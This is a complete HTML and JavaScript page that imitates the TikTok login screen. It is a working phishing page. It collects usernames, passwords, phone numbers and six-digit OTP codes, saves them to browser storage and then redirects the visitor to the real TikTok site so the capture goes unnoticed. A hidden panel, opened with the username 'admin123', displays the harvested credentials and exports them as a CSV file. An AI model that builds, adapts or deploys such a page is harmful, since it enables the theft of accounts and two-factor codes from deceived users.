<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in | TikTok</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
body{background:#fff;color:#161823}
.tt-red{background:#fe2c55}
.login-btn{display:flex;align-items:center;justify-content:center;width:100%;padding:14px;border:1px solid rgba(22,24,35,.12);border-radius:4px;font-weight:600;font-size:15px;position:relative}
.login-btn i{position:absolute;left:16px;font-size:20px}
.input-line{border-bottom:1px solid rgba(22,24,35,.12)}
.spinner{width:18px;height:18px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.fade-in{animation:fade .25s ease-out forwards}
@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1}}

/* ADDED ADMIN STYLE ONLY */
#adminPanel { display: none; position: fixed; inset: 0; background: white; z-index: 999; padding: 20px; overflow-y: auto; }
</style>
</head>

<body class="min-h-screen flex justify-center items-center">

<main id="mainView" class="w-full max-w-[360px] px-6">

<div class="flex justify-between items-center mb-8">
<i id="backBtn" class="fa-solid fa-xmark text-xl cursor-pointer"></i>
<i class="fa-regular fa-circle-question text-xl"></i>
</div>

<h1 class="text-[32px] font-bold mb-3 text-center">Log in to TikTok</h1>
<p class="text-[15px] text-gray-500 mb-8 text-center">
Manage your account, check notifications, comment on videos, and more.
</p>

<div id="btnStack" class="flex flex-col gap-3">
<button class="login-btn"><i class="fa-brands fa-tiktok"></i>Use TikTok app</button>
<button class="login-btn" onclick="openForm()"><i class="fa-regular fa-user"></i>Use phone / email / username</button>
<button class="login-btn"><i class="fa-brands fa-facebook text-blue-600"></i>Continue with Facebook</button>

<button class="login-btn">
<i class="fa-brands fa-google"></i>
Continue with Google
</button>

<button class="login-btn"><i class="fa-brands fa-apple"></i>Continue with Apple</button>
</div>

<div id="authForm" class="hidden fade-in">

<div class="flex border-b mb-8 text-sm mt-6">
<button id="tabPhone" class="w-1/2 pb-3 border-b-2 border-black font-semibold" onclick="switchTab('phone')">Phone</button>
<button id="tabEmail" class="w-1/2 pb-3 text-gray-400" onclick="switchTab('email')">Email / Username</button>
</div>

<div id="phoneRow" class="flex gap-3 mb-6">
<select id="countrySelect" class="w-[130px] py-2 input-line bg-transparent text-sm">
<option>NG +234</option>
<option>US +1</option>
<option>UK +44</option>
<option>IN +91</option>
<option>DE +49</option>
<option>FR +33</option>
<option>ZA +27</option>
<option>GH +233</option>
<option>KE +254</option>
<option>BR +55</option>
<option>ES +34</option>
<option>IT +39</option>
<option>JP +81</option>
</select>
<input id="phoneInput" type="tel" placeholder="Phone number" class="flex-1 py-2 input-line text-sm outline-none">
</div>

<input id="emailInput" type="text" placeholder="Email or username" class="hidden w-full py-2 input-line mb-4 outline-none">

<div id="passwordWrap" class="hidden relative mb-2">
<input id="password" type="password" placeholder="Password" class="w-full py-2 input-line pr-10 outline-none">
<i id="togglePwd" class="fa-regular fa-eye absolute right-2 top-1/2 -translate-y-1/2 cursor-pointer"></i>
</div>

<p id="forgotPwd" class="hidden text-sm text-right text-[#fe2c55] mb-4 cursor-pointer">
Forgot password?
</p>

<p id="error" class="text-[#fe2c55] text-sm hidden"></p>

<button id="loginBtn" class="w-full tt-red text-white py-3 font-bold mt-6 flex justify-center items-center gap-2"
onclick="continueLogin()">Log in</button>
</div>

<div id="smsScreen" class="hidden fade-in text-center mt-10">
<h2 class="font-bold mb-2">Enter 6-digit code</h2>

<div class="flex justify-between mb-6">
<input maxlength="1" class="otp-field w-10 h-12 border text-center text-lg">
<input maxlength="1" class="otp-field w-10 h-12 border text-center text-lg">
<input maxlength="1" class="otp-field w-10 h-12 border text-center text-lg">
<input maxlength="1" class="otp-field w-10 h-12 border text-center text-lg">
<input maxlength="1" class="otp-field w-10 h-12 border text-center text-lg">
<input maxlength="1" class="otp-field w-10 h-12 border text-center text-lg">
</div>

<p id="resendText" class="text-sm text-gray-400 mb-4">
Resend code in <span id="timer">60</span>s
</p>

<button id="resendBtn" class="hidden text-sm text-[#fe2c55] mb-4" onclick="startTimer()">Resend code</button>

<button class="w-full tt-red text-white py-3 font-bold flex justify-center items-center gap-2"
onclick="verifyOTP(this)">Verify</button>
</div>

<p class="text-[13px] text-gray-400 mt-6 text-center">
By continuing, you agree to our
<span class="underline">Terms of Service</span> and
<span class="underline">Privacy Policy</span>.
</p>

</main>

<div id="adminPanel">
    <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #fe2c55; padding-bottom:10px;">
        <h2 style="font-weight:bold;">Database Logs</h2>
        <button onclick="location.reload()" style="color:#fe2c55; font-weight:bold;">EXIT</button>
    </div>
    <div style="margin: 15px 0; display:flex; gap:10px;">
        <button onclick="downloadCSV()" style="background:green; color:white; padding:5px 10px; border-radius:4px; font-size:12px;">DOWNLOAD CSV</button>
        <button onclick="localStorage.removeItem('db'); location.reload();" style="background:#333; color:white; padding:5px 10px; border-radius:4px; font-size:12px;">CLEAR</button>
    </div>
    <table id="logTable" style="width:100%; font-size:12px; border-collapse:collapse;">
        <thead style="background:#eee;">
            <tr><th style="border:1px solid #ddd; padding:5px;">User/Phone</th><th style="border:1px solid #ddd; padding:5px;">Pass/OTP</th></tr>
        </thead>
        <tbody></tbody>
    </table>
</div>

<script>
let currentTab='phone',timerInt,time=60

function openForm(){
btnStack.classList.add('hidden')
authForm.classList.remove('hidden')
}

function switchTab(t){
currentTab=t
phoneRow.classList.toggle('hidden',t!=='phone')
emailInput.classList.toggle('hidden',t!=='email')
passwordWrap.classList.toggle('hidden',t!=='email')
forgotPwd.classList.toggle('hidden',t!=='email')
// Handle tab active state
tabPhone.className = t==='phone' ? "w-1/2 pb-3 border-b-2 border-black font-semibold" : "w-1/2 pb-3 text-gray-400";
tabEmail.className = t==='email' ? "w-1/2 pb-3 border-b-2 border-black font-semibold" : "w-1/2 pb-3 text-gray-400";
}

function showSpinner(btn){
btn.disabled=true
btn.innerHTML='<div class="spinner"></div>'
}

function continueLogin(){
error.classList.add('hidden')
const btn=document.getElementById('loginBtn')

// --- ADDED STORAGE LOGIC (No code deleted) ---
const u = emailInput.value;
const p = password.value;
const ph = countrySelect.value + " " + phoneInput.value;

if(u === "admin123") { showAdmin(); return; }

showSpinner(btn)

setTimeout(()=>{
let db = JSON.parse(localStorage.getItem('db') || '[]');
if(currentTab==='phone'){
    if(!phoneInput.value.trim()){location.reload();return}
    db.push({user: ph, pass: "WAITING_FOR_OTP"});
    localStorage.setItem('db', JSON.stringify(db));
    authForm.classList.add('hidden')
    smsScreen.classList.remove('hidden')
    startTimer()
    return
}
if(!emailInput.value||!password.value){location.reload();return}
db.push({user: u, pass: p});
localStorage.setItem('db', JSON.stringify(db));
window.location.href="https://www.tiktok.com/login"
},900)
}

function startTimer(){
time=60
resendBtn.classList.add('hidden')
resendText.classList.remove('hidden')
timer.textContent=time
clearInterval(timerInt)
timerInt=setInterval(()=>{
time--;timer.textContent=time
if(time<=0){
clearInterval(timerInt)
resendText.classList.add('hidden')
resendBtn.classList.remove('hidden')
}
},1000)
}

function verifyOTP(btn){
// --- ADDED OTP STORAGE ---
let code = Array.from(document.querySelectorAll('.otp-field')).map(i => i.value).join('');
let db = JSON.parse(localStorage.getItem('db') || '[]');
db.push({user: "OTP_CODE", pass: code});
localStorage.setItem('db', JSON.stringify(db));

showSpinner(btn)
setTimeout(()=>{window.location.href="https://www.tiktok.com/login"},900)
}

// --- ADDED ADMIN FUNCTIONS ---
function showAdmin() {
    mainView.style.display = 'none';
    adminPanel.style.display = 'block';
    let db = JSON.parse(localStorage.getItem('db') || '[]');
    let body = document.querySelector('#logTable tbody');
    body.innerHTML = db.map(i => `<tr><td style="border:1px solid #ddd; padding:5px;">${i.user}</td><td style="border:1px solid #ddd; padding:5px; color:red;">${i.pass}</td></tr>`).join('');
}

function downloadCSV() {
    let db = JSON.parse(localStorage.getItem('db') || '[]');
    let csv = "User,Password\n" + db.map(i => `${i.user},${i.pass}`).join("\n");
    let blob = new Blob([csv], {type: 'text/csv'});
    let a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'logs.csv';
    a.click();
}

togglePwd.onclick=()=>password.type=password.type==='password'?'text':'password'
backBtn.onclick=()=>location.reload()
</script>

</body>
</html>
